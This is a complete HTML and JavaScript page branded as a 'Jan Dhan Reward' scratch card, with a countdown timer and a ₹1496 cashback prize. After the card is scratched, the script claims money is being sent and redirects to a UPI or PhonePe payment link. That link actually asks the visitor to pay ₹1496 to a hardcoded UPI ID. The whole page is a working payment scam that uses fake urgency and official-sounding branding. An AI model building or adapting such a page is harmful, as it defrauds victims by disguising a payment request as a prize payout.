<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jan Dhan Reward</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }
        
        html,
        body {
            width: 100%;
            height: 100%;
            background: #f4f4f4;
            overflow-x: hidden;
        }
        
        .container {
            width: 100%;
            min-height: 100vh;
            background: #fff;
        }
        
        .top-image {
            position: relative;
            width: 100%;
        }
        
        .top-image img {
            width: 100%;
            display: block;
        }
        
        .timer-container {
            position: absolute;
            top: 78%;
            left: 24%;
            transform: translate(-50%, -50%);
            display: flex;
            align-items: center;
            gap: 8px;
            z-index: 20;
        }
        
        .timer {
            color: #fff;
            font-size: clamp(10px, 6.5vw, 25px);
            font-weight: 700;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
            letter-spacing: 2px;
        }
        
        .reward-section {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px 0;
        }
        
        .reward-box {
            position: relative;
            width: min(320px, 90vw);
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
        }
        
        .reward-image {
            width: 100%;
            display: block;
        }
        
        .scratch-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            cursor: grab;
        }
        
        .scratch-canvas {
            width: 100%;
            height: 100%;
            display: block;
        }
        
        .reward-price {
            position: absolute;
            left: 50%;
            top: 75%;
            transform: translate(-50%, -50%);
            font-size: clamp(50px, 8vw, 90px);
            font-weight: 900;
            color: #000;
            text-shadow: 2px 2px 4px rgba(255, 255, 255, 0.9);
            letter-spacing: -2px;
            z-index: 5;
        }
        
        .bottom-image img {
            width: 100%;
            display: block;
        }
        
        /* Redirect overlay */
        .redirect-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .redirect-overlay.show {
            display: flex;
        }
        
        .redirect-box {
            background: white;
            padding: 30px 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: popIn 0.5s ease-out;
        }
        
        @keyframes popIn {
            from {
                transform: scale(0.8);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .redirect-box .reward-amount {
            font-size: 48px;
            font-weight: 900;
            color: #4CAF50;
            margin: 10px 0;
        }
        
        .redirect-box .reward-label {
            font-size: 18px;
            color: #666;
            margin-bottom: 10px;
        }
        
        .redirect-box .upi-text {
            font-size: 14px;
            color: #888;
            background: #f5f5f5;
            padding: 10px;
            border-radius: 8px;
            margin: 15px 0;
            word-break: break-all;
        }
        
        .redirect-box .redirecting-text {
            font-size: 16px;
            color: #333;
            margin-top: 10px;
            font-weight: 600;
        }
        
        .redirect-box .spinner {
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="top-image">
            <img src="Top.png" alt="">
            <div class="timer-container">
                <img src="timer.png" width="38" height="38" alt="⏰" id="timer-icon">
                <span class="timer" id="timer">04:59</span>
            </div>
        </div>

        <div class="reward-section">
            <div class="reward-box">
                <img src="reward-image.png" class="reward-image" alt="Reward">
                <div class="scratch-container">
                    <canvas class="scratch-canvas" id="scratchCanvas"></canvas>
                </div>
                <div class="reward-price" id="amount">₹1496</div>
            </div>
        </div>

        <div class="bottom-image">
            <img src="Down.png" alt="">
        </div>
        <br><br><br><br><br>
    </div>

    <!-- Redirect Overlay -->
    <div class="redirect-overlay" id="redirectOverlay">
        <div class="redirect-box">
            <div style="font-size: 50px;">🎉</div>
            <div class="reward-label">Congratulations! You Won</div>
            <div class="reward-amount" id="winAmount">₹1496</div>
            <div class="upi-text">Sending to: 8271514079-1@nyes</div>
            <div class="spinner"></div>
            <div class="redirecting-text">Redirecting to PhonePe...</div>
        </div>
    </div>

    <script>
        // Timer Logic
        let timeLeft = 4 * 60 + 59;

        function startCountdown() {
            const el = document.getElementById('timer');
            const timerInterval = setInterval(() => {
                const m = Math.floor(timeLeft / 60);
                const s = timeLeft % 60;
                el.textContent = `${m}:${s.toString().padStart(2,'0')}`;
                timeLeft--;
                if (timeLeft < 0) clearInterval(timerInterval);
            }, 1000);
        }

        // Scratch Logic
        const canvas = document.getElementById('scratchCanvas');
        const ctx = canvas.getContext('2d');
        let totalPixels = 0;
        let isCompleted = false;
        let redirectTimeout = null;

        function resizeCanvas() {
            const box = document.querySelector('.reward-box');
            canvas.width = box.offsetWidth;
            canvas.height = box.offsetHeight;
            totalPixels = canvas.width * canvas.height;
        }

        function drawScratchOverlay() {
            ctx.fillStyle = '#3a86ff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = 'rgba(255, 255, 255, 0.08)';

            ctx.font = 'bold 110px Arial';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText('G', canvas.width / 2, canvas.height / 2 + 10);

            ctx.font = '30px Arial';
            ctx.fillText('🏆', 40, canvas.height - 70);
            ctx.fillText('🛍️', canvas.width - 50, canvas.height - 80);
            ctx.fillText('✨', 50, 110);
            ctx.fillText('🌟', canvas.width - 60, 120);
            ctx.fillText('🎉', canvas.width / 2, 130);

            for (let i = 0; i < 6; i++) {
                ctx.beginPath();
                ctx.arc(40 + (i * 50), 160 + (i * 10), 4, 0, Math.PI * 2);
                ctx.fill();
            }

            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 26px Arial, Helvetica, sans-serif';
            ctx.fillText('SCRATCH HERE', canvas.width / 2, 45);

            ctx.font = 'bold 24px Arial, Helvetica, sans-serif';
            ctx.fillText('CLAIM YOUR', canvas.width / 2, canvas.height - 75);

            ctx.font = 'bold 26px Arial, Helvetica, sans-serif';
            ctx.fillText('CASHBACK', canvas.width / 2, canvas.height - 40);
        }

        function getScratchedPercentage() {
            if (totalPixels === 0) return 0;
            try {
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                let transparent = 0;
                for (let i = 3; i < data.length; i += 4) {
                    if (data[i] < 150) {
                        transparent++;
                    }
                }
                return Math.round((transparent / totalPixels) * 100);
            } catch (e) {
                return 0;
            }
        }

        function getRewardAmount() {
            const amountEl = document.getElementById('amount');
            const raw = amountEl.textContent;
            const match = raw.match(/\d+/);
            return match ? match[0] : '1496';
        }

        function redirectToPhonePe() {
            const amount = getRewardAmount();
            const upi = '8271514079-1@nyes';
            const description = 'you won';
            
            // Show the overlay with the amount
            const overlay = document.getElementById('redirectOverlay');
            document.getElementById('winAmount').textContent = `₹${amount}`;
            overlay.classList.add('show');
            
            // After 2.5 seconds, redirect to PhonePe
            setTimeout(() => {
                // PhonePe UPI deep link
                const phonepeUrl = `upi://pay?pa=${upi}&pn=Jan%20Dhan%20Reward&am=${amount}&cu=INR&tn=${encodeURIComponent(description)}`;
                
                // Also try the web fallback
                const webUrl = `https://phon.pe/${upi}?amount=${amount}&description=${encodeURIComponent(description)}`;
                
                // Try PhonePe app first, fallback to web
                const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
                
                if (isMobile) {
                    // Try to open PhonePe app
                    window.location.href = phonepeUrl;
                    
                    // If app doesn't open, fallback to web after 2 seconds
                    setTimeout(() => {
                        window.location.href = webUrl;
                    }, 2000);
                } else {
                    // Desktop - open web version
                    window.location.href = webUrl;
                }
            }, 2500);
        }

        function scratch(x, y) {
            if (isCompleted) return;

            ctx.globalCompositeOperation = 'destination-out';
            ctx.beginPath();
            ctx.arc(x, y, 36, 0, Math.PI * 2);
            ctx.fill();

            const percent = getScratchedPercentage();

            if (percent >= 60 && !isCompleted) {
                isCompleted = true;
                autoCompleteScratch();
            }
        }

        function autoCompleteScratch() {
            ctx.globalCompositeOperation = 'destination-out';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            launchLightCelebration();
            
            // Redirect after 2.5 seconds of celebration
            if (redirectTimeout) clearTimeout(redirectTimeout);
            redirectTimeout = setTimeout(() => {
                redirectToPhonePe();
            }, 2500);
        }

        function launchLightCelebration() {
            const emojis = ['💸', '💵', '🪙', '💰', '💴', '💶', '💷', '🎉'];
            const rect = document.querySelector('.reward-box').getBoundingClientRect();

            for (let i = 0; i < 45; i++) {
                setTimeout(() => {
                    const emoji = document.createElement('div');
                    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                    emoji.style.position = 'fixed';
                    emoji.style.left = (Math.random() * window.innerWidth) + 'px';
                    emoji.style.top = '-50px';
                    emoji.style.fontSize = Math.floor(Math.random() * 20 + 25) + 'px';
                    emoji.style.zIndex = '100';
                    emoji.style.pointerEvents = 'none';
                    emoji.style.transition = 'transform 3s cubic-bezier(0.25, 0.1, 0.25, 1), opacity 3s';
                    document.body.appendChild(emoji);

                    setTimeout(() => {
                        emoji.style.transform = `translateY(${window.innerHeight + 100}px) rotate(${Math.random() * 360}deg)`;
                    }, 50);

                    setTimeout(() => emoji.remove(), 3200);
                }, i * 80);
            }

            for (let i = 0; i < 40; i++) {
                setTimeout(() => {
                    const p = document.createElement('div');
                    p.style.position = 'fixed';
                    p.style.width = Math.floor(Math.random() * 8 + 8) + 'px';
                    p.style.height = Math.floor(Math.random() * 8 + 8) + 'px';
                    p.style.borderRadius = '50%';
                    p.style.background = ['#ff0088', '#00ffcc', '#ffff00', '#00aaff', '#ffcc00', '#ff5722'][Math.floor(Math.random() * 6)];

                    p.style.left = (rect.left + rect.width / 2) + 'px';
                    p.style.top = (rect.top + rect.height / 2) + 'px';
                    p.style.zIndex = '99';
                    p.style.pointerEvents = 'none';
                    p.style.transition = 'transform 2s ease-out, opacity 2s';
                    document.body.appendChild(p);

                    const angle = Math.random() * Math.PI * 2;
                    const velocity = Math.random() * 220 + 80;
                    const xMove = Math.cos(angle) * velocity;
                    const yMove = Math.sin(angle) * velocity - 120;

                    setTimeout(() => {
                        p.style.transform = `translate(${xMove}px, ${yMove}px) scale(0.3)`;
                        p.style.opacity = '0';
                    }, 50);

                    setTimeout(() => p.remove(), 2200);
                }, i * 20);
            }
        }

        // Input Pos Tracking
        let isScratching = false;

        function getMousePos(e) {
            const r = canvas.getBoundingClientRect();
            return {
                x: e.clientX - r.left,
                y: e.clientY - r.top
            };
        }

        function getTouchPos(e) {
            const r = canvas.getBoundingClientRect();
            return {
                x: e.touches[0].clientX - r.left,
                y: e.touches[0].clientY - r.top
            };
        }

        canvas.addEventListener('mousedown', e => {
            isScratching = true;
            const pos = getMousePos(e);
            scratch(pos.x, pos.y);
        });

        canvas.addEventListener('mousemove', e => {
            if (isScratching) {
                const pos = getMousePos(e);
                scratch(pos.x, pos.y);
            }
        });

        window.addEventListener('mouseup', () => isScratching = false);

        canvas.addEventListener('touchstart', e => {
            isScratching = true;
            if (e.touches.length > 0) {
                const pos = getTouchPos(e);
                scratch(pos.x, pos.y);
            }
        }, { passive: true });

        canvas.addEventListener('touchmove', e => {
            if (isScratching && e.touches.length > 0) {
                const pos = getTouchPos(e);
                scratch(pos.x, pos.y);
            }
        }, { passive: true });

        canvas.addEventListener('touchend', () => isScratching = false);

        // Init Setup
        window.addEventListener('load', () => {
            resizeCanvas();
            drawScratchOverlay();
            startCountdown();
            document.getElementById("amount").innerHTML = "₹1496";
        });

        window.addEventListener('resize', () => {
            resizeCanvas();
            drawScratchOverlay();
        });
    </script>
</body>

</html>
